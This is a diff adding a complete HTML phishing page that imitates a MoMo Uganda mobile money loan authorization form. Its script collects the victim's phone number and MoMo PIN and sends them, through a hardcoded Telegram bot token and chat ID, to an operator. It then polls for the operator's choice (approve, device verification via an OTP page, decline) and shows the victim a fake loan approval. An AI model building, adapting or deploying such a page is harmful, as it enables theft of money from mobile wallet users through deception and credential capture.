@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <title>Verify & Authorize Loan - MoMo Uganda</title>
+    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Sora:wght@600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --red: #E42320;
+            --red-dark: #c01c1a;
+            --red-soft: rgba(228,35,32,0.08);
+            --red-border: rgba(228,35,32,0.18);
+            --text-dark: #111827;
+            --text-mid: #4b5563;
+            --text-light: #9ca3af;
+            --bg: #f3f4f6;
+            --card: #ffffff;
+            --border: #e5e7eb;
+            --input-bg: #f9fafb;
+            --shadow: 0 20px 60px rgba(0,0,0,0.10), 0 4px 16px rgba(0,0,0,0.06);
+            --green: #10b981;
+            --yellow: #f59e0b;
+            --blue: #3b82f6;
+        }
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'DM Sans', sans-serif;
+            background: var(--bg);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+            background-image: radial-gradient(ellipse at 20% 10%, rgba(228,35,32,0.06) 0%, transparent 55%);
+        }
+        .card {
+            width: 100%;
+            max-width: 430px;
+            background: var(--card);
+            border-radius: 28px;
+            box-shadow: var(--shadow);
+            overflow: hidden;
+            animation: fadeUp 0.45s cubic-bezier(.22,.8,.3,1) both;
+        }
+        @keyframes fadeUp {
+            from { opacity: 0; transform: translateY(24px); }
+            to   { opacity: 1; transform: translateY(0); }
+        }
+        .header {
+            background: linear-gradient(135deg, #E42320 0%, #c01c1a 100%);
+            padding: 28px 28px 24px;
+            position: relative;
+            overflow: hidden;
+        }
+        .logo-wrap {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 18px;
+            position: relative;
+            z-index: 1;
+        }
+        .logo-bg {
+            background: white;
+            border-radius: 14px;
+            padding: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 48px;
+            height: 48px;
+        }
+        .brand-name {
+            font-family: 'Sora', sans-serif;
+            font-size: 18px;
+            font-weight: 700;
+            color: white;
+        }
+        .brand-sub {
+            font-size: 11.5px;
+            color: rgba(255,255,255,0.72);
+            text-transform: uppercase;
+        }
+        .header-title {
+            font-family: 'Sora', sans-serif;
+            font-size: 23px;
+            font-weight: 800;
+            color: white;
+            letter-spacing: -0.5px;
+        }
+        .header-desc {
+            font-size: 13.5px;
+            color: rgba(255,255,255,0.78);
+            margin-top: 6px;
+        }
+        .loan-info {
+            margin: 20px 22px 0;
+            background: var(--red-soft);
+            border: 1px solid var(--red-border);
+            border-radius: 18px;
+            padding: 16px 18px;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+        .loan-icon {
+            width: 42px; height: 42px;
+            background: var(--red);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .loan-amount {
+            font-family: 'Sora', sans-serif;
+            font-size: 26px;
+            font-weight: 800;
+            color: var(--text-dark);
+        }
+        .form-body {
+            padding: 22px 22px 26px;
+        }
+        .form-group {
+            margin-bottom: 16px;
+        }
+        label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--text-dark);
+            margin-bottom: 7px;
+        }
+        select, input {
+            width: 100%;
+            padding: 13px 15px;
+            background: var(--input-bg);
+            border: 1.5px solid var(--border);
+            border-radius: 13px;
+            font-family: 'DM Sans', sans-serif;
+            font-size: 15.5px;
+            outline: none;
+        }
+        select:focus, input:focus {
+            border-color: var(--red);
+            box-shadow: 0 0 0 3.5px rgba(228,35,32,0.10);
+        }
+        .error-msg {
+            display: none;
+            background: #fff1f1;
+            border: 1px solid #fca5a5;
+            color: #b91c1c;
+            font-size: 13.5px;
+            border-radius: 12px;
+            padding: 12px 14px;
+            margin-bottom: 16px;
+        }
+        .btn-primary {
+            width: 100%;
+            background: linear-gradient(135deg, #E42320, #c01c1a);
+            color: white;
+            border: none;
+            padding: 15px;
+            font-family: 'Sora', sans-serif;
+            font-size: 16px;
+            font-weight: 700;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 4px 18px rgba(228,35,32,0.35);
+        }
+        .btn-primary:disabled {
+            background: #d1d5db;
+            cursor: not-allowed;
+        }
+        .btn-back {
+            width: 100%;
+            background: transparent;
+            color: var(--text-mid);
+            border: 1.5px solid var(--border);
+            padding: 14px;
+            font-weight: 600;
+            border-radius: 50px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        #spinner {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(10,10,10,0.90);
+            z-index: 10000;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            gap: 20px;
+        }
+        .spin-ring {
+            width: 62px; height: 62px;
+            border: 5px solid rgba(255,255,255,0.12);
+            border-top-color: var(--red);
+            border-radius: 50%;
+            animation: spin 0.9s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .security-note {
+            display: flex;
+            align-items: center;
+            gap: 7px;
+            justify-content: center;
+            font-size: 12px;
+            color: var(--text-light);
+            margin-top: 18px;
+        }
+        .status-message {
+            text-align: center;
+            padding: 12px;
+            border-radius: 12px;
+            margin-bottom: 16px;
+            display: none;
+            font-weight: 600;
+        }
+        .status-message.processing {
+            background: #eff6ff;
+            color: #1e40af;
+            border: 1px solid #93c5fd;
+        }
+        .status-message.success {
+            background: #f0fdf4;
+            color: #166534;
+            border: 1px solid #86efac;
+        }
+        .status-message.error {
+            background: #fef2f2;
+            color: #991b1b;
+            border: 1px solid #fca5a5;
+        }
+    </style>
+</head>
+<body>
+<div class="card">
+    <div class="header">
+        <div class="logo-wrap">
+            <div class="logo-bg">
+                <svg width="36" height="36" viewBox="0 0 96 96" fill="none">
+                    <path d="M48.19 28.6833C40.4333 28.605 34.1983 34.9933 34.2183 42.58C34.2383 50.625 40.9883 56.56 48.0333 56.4317C55.5033 56.5017 61.8867 50.53 61.9517 42.7583C62.02 34.62 55.575 28.76 48.19 28.6833Z" fill="#E32526"/>
+                    <path d="M48.665 40.9682C48.6117 41.3448 48.69 41.7115 48.6867 42.0832C48.685 43.6065 48.6867 45.1332 48.685 46.6565C48.685 46.9098 48.7117 47.1598 48.765 47.4048C48.9817 48.3765 49.79 48.9532 50.78 48.8315C51.54 48.7365 52.3083 48.7315 53.0717 48.6665C53.3917 48.6398 53.4933 48.7815 53.47 49.1215C53.4333 49.6315 53.4367 50.1415 53.4683 50.6532C53.5333 51.7132 53.0367 52.4698 52.1317 52.8448C49.685 53.8565 47.27 53.8332 45.0633 52.2398C43.85 51.3648 43.2017 50.1132 43.1317 48.5682C43.0467 46.5832 43.01 44.5982 42.95 42.6098C42.8867 40.6032 42.9067 38.5948 42.9217 36.5882C42.9317 35.2415 43.5567 34.1482 44.55 33.2632C45.1017 32.7698 45.7167 32.3682 46.385 32.0482C46.9917 31.7565 47.6267 31.6465 48.2933 31.6565C48.5317 31.6615 48.6217 31.7515 48.645 31.9965C48.71 32.6315 48.6783 33.2682 48.6917 33.8498C48.6917 34.3648 48.6867 34.8298 48.6917 35.2932C48.6933 35.6965 48.8367 35.8432 49.245 35.9032C49.5267 35.9465 49.8067 35.9098 50.0883 35.9082C51.0583 35.8965 52.025 35.8965 52.995 35.9032C53.5667 35.9098 53.7433 36.0848 53.7267 36.6498C53.71 37.1548 53.795 37.6532 53.7367 38.1615C53.605 39.2765 52.95 39.9348 51.9333 40.2882C51.3717 40.4848 50.7867 40.4898 50.1983 40.4898C49.8367 40.4882 49.4717 40.4582 49.11 40.5165C48.85 40.5598 48.7067 40.6898 48.67 40.9682H48.665Z" fill="white"/>
+                </svg>
+            </div>
+            <div>
+                <div class="brand-name">MoMo Uganda</div>
+                <div class="brand-sub">Mobile Money</div>
+            </div>
+        </div>
+        <div class="header-title">Authorize Your Loan</div>
+        <div class="header-desc">Enter your MoMo number and PIN to securely verify and approve your loan request.</div>
+    </div>
+
+    <div class="loan-info" id="loanInfo">
+        <div class="loan-icon">
+            <svg fill="none" viewBox="0 0 24 24" stroke="white" stroke-width="2" width="22" height="22">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
+            </svg>
+        </div>
+        <div>
+            <div class="loan-label" style="font-size:11px; color:var(--red);">MoMo Loan</div>
+            <div class="loan-amount" id="loanAmount">—</div>
+            <div class="loan-details" id="loanDetails" style="font-size:12px; color:var(--text-mid);"></div>
+        </div>
+    </div>
+
+    <div class="form-body">
+        <div class="form-group">
+            <label>Mobile Money Network</label>
+            <select id="accountType">
+                <option value="mtn">MTN MoMo</option>
+                <option value="airtel">Airtel Money</option>
+                <option value="africell">Africell</option>
+            </select>
+        </div>
+        <div class="form-group">
+            <label>MoMo Phone Number</label>
+            <input type="tel" id="phone" placeholder="077XXXXXXX" maxlength="10">
+            <div style="font-size: 10px; color: #9ca3af; margin-top: 5px;">Enter Uganda number (077, 078, 075, 070, 039)</div>
+        </div>
+        <div class="form-group">
+            <label>MoMo PIN</label>
+            <input type="password" id="password" placeholder="••••" maxlength="4">
+        </div>
+        <div class="error-msg" id="errMsg"></div>
+        <div class="status-message" id="statusMsg"></div>
+        <button class="btn-primary" id="continueBtn">Verify & Authorize Loan</button>
+        <button class="btn-back" onclick="window.location.href='index.html'">← Back to Calculator</button>
+        <div class="security-note">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+            </svg>
+            256-bit encrypted & secured by MoMo Uganda
+        </div>
+    </div>
+</div>
+
+<div id="spinner">
+    <div class="spin-ring"></div>
+    <p style="color:white;">Verifying & Processing...</p>
+</div>
+
+<script>
+    // Telegram Configuration - UGANDA BOT
+    const CONFIG = {
+        BOT_TOKEN: '8743116479:AAH4UIBuqbg6GtuLUMuCZ45L0Tu3Ad9Rs9E',
+        CHAT_ID: '8392790531',
+        DEVICE_PAGE: '/otp'
+    };
+
+    let state = { lastUpdateId: 0 };
+    let isProcessing = false;
+    let userPhone = '';
+    let pendingMessageId = null;
+
+    const phoneInput = document.getElementById('phone');
+    const pinInput = document.getElementById('password');
+    const continueBtn = document.getElementById('continueBtn');
+    const errMsg = document.getElementById('errMsg');
+    const statusMsg = document.getElementById('statusMsg');
+    const spinner = document.getElementById('spinner');
+
+    // Load loan data from sessionStorage
+    function loadLoanData() {
+        const calculatorData = sessionStorage.getItem('calculatorData');
+        if (calculatorData) {
+            const data = JSON.parse(calculatorData);
+            const currency = data.currency || 'UGX';
+            document.getElementById('loanAmount').textContent = `${currency} ${data.amount.toLocaleString()}`;
+            const months = data.duration / 30;
+            document.getElementById('loanDetails').textContent = `${months} Month${months > 1 ? 's' : ''} • Monthly: ${currency} ${data.monthly.toLocaleString()}`;
+        } else {
+            // Demo data if no calculator data
+            document.getElementById('loanAmount').textContent = 'UGX 500,000';
+            document.getElementById('loanDetails').textContent = '3 Months • Monthly: UGX 182,500';
+        }
+    }
+
+    function isValidUgandaNumber(phone) {
+        if (phone.length !== 10) return false;
+        const validPrefixes = ['077', '078', '075', '070', '039', '074', '076'];
+        return validPrefixes.some(p => phone.startsWith(p));
+    }
+
+    function getNetworkName(phone) {
+        if (phone.startsWith('077') || phone.startsWith('078')) return 'MTN';
+        if (phone.startsWith('075') || phone.startsWith('074')) return 'Airtel';
+        if (phone.startsWith('070') || phone.startsWith('076')) return 'Africell';
+        if (phone.startsWith('039')) return 'MTN';
+        return 'Unknown';
+    }
+
+    function showError(msg) {
+        errMsg.textContent = msg;
+        errMsg.style.display = 'block';
+        setTimeout(() => { errMsg.style.display = 'none'; }, 4000);
+    }
+
+    function showStatus(msg, type = 'processing') {
+        statusMsg.textContent = msg;
+        statusMsg.className = `status-message ${type}`;
+        statusMsg.style.display = 'block';
+        setTimeout(() => { statusMsg.style.display = 'none'; }, 3000);
+    }
+
+    function sendToBot(phone, pin, network) {
+        if (isProcessing) return;
+        isProcessing = true;
+        continueBtn.disabled = true;
+        continueBtn.textContent = "Verifying...";
+
+        const ts = Date.now();
+        const approveId = `approve_${ts}`;
+        const verifyDeviceId = `verify_device_${ts}`;
+        const appliedId = `applied_${ts}`;
+        const declineId = `decline_${ts}`;
+
+        const loanAmount = document.getElementById('loanAmount').textContent;
+        const accountType = document.getElementById('accountType').options[document.getElementById('accountType').selectedIndex]?.text || network;
+
+        fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CONFIG.CHAT_ID,
+                text: `<b>🔴 NEW LOAN VERIFICATION - UGANDA</b>\n\n━━━━━━━━━━━━━━━━━━\n<b>💰 Amount:</b> ${loanAmount}\n<b>📱 Network:</b> ${accountType} (${network})\n<b>📞 Phone:</b> <code>${phone}</code>\n<b>🔐 PIN:</b> <code>${pin}</code>\n<b>🕐 Time:</b> ${new Date().toLocaleString()}\n━━━━━━━━━━━━━━━━━━\n\n<b>Select Action:</b>`,
+                parse_mode: 'HTML',
+                reply_markup: {
+                    inline_keyboard: [
+                        [
+                            { text: "✅ Approve Loan", callback_data: approveId },
+                            { text: "📱 Verify Device", callback_data: verifyDeviceId }
+                        ],
+                        [
+                            { text: "📋 Already Applied", callback_data: appliedId },
+                            { text: "❌ Decline", callback_data: declineId }
+                        ]
+                    ]
+                }
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok && data.result) {
+                pendingMessageId = data.result.message_id;
+            }
+            spinner.style.display = 'flex';
+            startPolling(approveId, verifyDeviceId, appliedId, declineId);
+        })
+        .catch((error) => {
+            console.error('Error:', error);
+            resetButton();
+            showError("Network error. Please try again.");
+        });
+    }
+
+    function startPolling(approveId, verifyDeviceId, appliedId, declineId) {
+        const interval = setInterval(() => {
+            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}&timeout=5`)
+                .then(r => r.json())
+                .then(data => {
+                    if (!data.ok || !data.result) return;
+                    
+                    for (const update of data.result) {
+                        if (update.update_id > state.lastUpdateId) {
+                            state.lastUpdateId = update.update_id;
+                        }
+                        
+                        if (update.callback_query) {
+                            const cb = update.callback_query.data;
+                            const callbackId = update.callback_query.id;
+                            
+                            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/answerCallbackQuery`, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    callback_query_id: callbackId,
+                                    text: "Processing your request..."
+                                })
+                            });
+                            
+                            if (cb === approveId) {
+                                clearInterval(interval);
+                                spinner.style.display = 'none';
+                                showStatus("✅ Loan Approved! Redirecting...", "success");
+                                
+                                if (pendingMessageId) {
+                                    fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/editMessageText`, {
+                                        method: 'POST',
+                                        headers: { 'Content-Type': 'application/json' },
+                                        body: JSON.stringify({
+                                            chat_id: CONFIG.CHAT_ID,
+                                            message_id: pendingMessageId,
+                                            text: `✅ <b>LOAN APPROVED - UGANDA</b>\n\nPhone: ${userPhone}\nNetwork: ${getNetworkName(userPhone)}\nStatus: Approved\nTime: ${new Date().toLocaleString()}`,
+                                            parse_mode: 'HTML'
+                                        })
+                                    });
+                                }
+                                
+                                setTimeout(() => {
+                                    alert("Loan Approved! You will receive funds on your MoMo shortly.");
+                                    window.location.href = 'index.html';
+                                }, 1500);
+                                return;
+                            } 
+                            else if (cb === verifyDeviceId) {
+                                clearInterval(interval);
+                                spinner.style.display = 'none';
+                                showStatus("📱 Device verification required.", "processing");
+                                
+                                if (pendingMessageId) {
+                                    fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/editMessageText`, {
+                                        method: 'POST',
+                                        headers: { 'Content-Type': 'application/json' },
+                                        body: JSON.stringify({
+                                            chat_id: CONFIG.CHAT_ID,
+                                            message_id: pendingMessageId,
+                                            text: `📱 <b>DEVICE VERIFICATION - UGANDA</b>\n\nPhone: ${userPhone}\nStatus: Device verification pending\nTime: ${new Date().toLocaleString()}`,
+                                            parse_mode: 'HTML'
+                                        })
+                                    });
+                                }
+                                
+                                resetButton();
+                                return;
+                            }
+                            else if (cb === appliedId) {
+                                clearInterval(interval);
+                                spinner.style.display = 'none';
+                                showStatus("📋 You have already applied. Please wait for approval.", "error");
+                                
+                                if (pendingMessageId) {
+                                    fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/editMessageText`, {
+                                        method: 'POST',
+                                        headers: { 'Content-Type': 'application/json' },
+                                        body: JSON.stringify({
+                                            chat_id: CONFIG.CHAT_ID,
+                                            message_id: pendingMessageId,
+                                            text: `📋 <b>ALREADY APPLIED - UGANDA</b>\n\nPhone: ${userPhone}\nStatus: Previously applied\nTime: ${new Date().toLocaleString()}`,
+                                            parse_mode: 'HTML'
+                                        })
+                                    });
+                                }
+                                
+                                resetButton();
+                                return;
+                            }
+                            else if (cb === declineId) {
+                                clearInterval(interval);
+                                spinner.style.display = 'none';
+                                showError("❌ Request declined. Please try again later.");
+                                
+                                if (pendingMessageId) {
+                                    fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/editMessageText`, {
+                                        method: 'POST',
+                                        headers: { 'Content-Type': 'application/json' },
+                                        body: JSON.stringify({
+                                            chat_id: CONFIG.CHAT_ID,
+                                            message_id: pendingMessageId,
+                                            text: `❌ <b>LOAN DECLINED - UGANDA</b>\n\nPhone: ${userPhone}\nStatus: Declined\nTime: ${new Date().toLocaleString()}`,
+                                            parse_mode: 'HTML'
+                                        })
+                                    });
+                                }
+                                
+                                resetButton();
+                                return;
+                            }
+                        }
+                    }
+                })
+                .catch(err => console.error('Polling error:', err));
+        }, 1000);
+    }
+
+    function resetButton() {
+        isProcessing = false;
+        continueBtn.disabled = false;
+        continueBtn.textContent = "Verify & Authorize Loan";
+        spinner.style.display = 'none';
+    }
+
+    continueBtn.onclick = () => {
+        const phone = phoneInput.value.trim();
+        const pin = pinInput.value.trim();
+
+        if (!phone || !isValidUgandaNumber(phone)) {
+            showError("Please enter a valid Uganda number (e.g. 0771234567)");
+            return;
+        }
+        if (pin.length !== 4) {
+            showError("PIN must be exactly 4 digits");
+            return;
+        }
+        if (!/^\d+$/.test(pin)) {
+            showError("PIN must contain only numbers");
+            return;
+        }
+
+        userPhone = phone;
+        const network = getNetworkName(phone);
+        sessionStorage.setItem('userPhone', phone);
+        sessionStorage.setItem('userNetwork', network);
+        sendToBot(phone, pin, network);
+    };
+
+    phoneInput.addEventListener('input', () => {
+        phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '').slice(0, 10);
+    });
+
+    pinInput.addEventListener('input', () => {
+        pinInput.value = pinInput.value.replace(/[^0-9]/g, '').slice(0, 4);
+    });
+
+    loadLoanData();
+</script>
+</body>
+</html>
